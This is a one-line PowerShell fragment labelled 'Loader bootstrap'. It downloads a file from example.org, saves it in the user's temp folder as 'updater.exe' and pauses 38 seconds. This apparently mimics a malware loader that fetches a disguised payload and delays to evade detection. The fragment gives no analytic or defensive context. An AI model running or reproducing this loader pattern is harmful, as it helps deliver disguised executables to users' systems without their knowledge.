<# Loader bootstrap #> Start-BitsTransfer -Source 'http://example.org/update.dat' -Destination "$env:TEMP\updater.exe"; Start-Sleep -Seconds 38
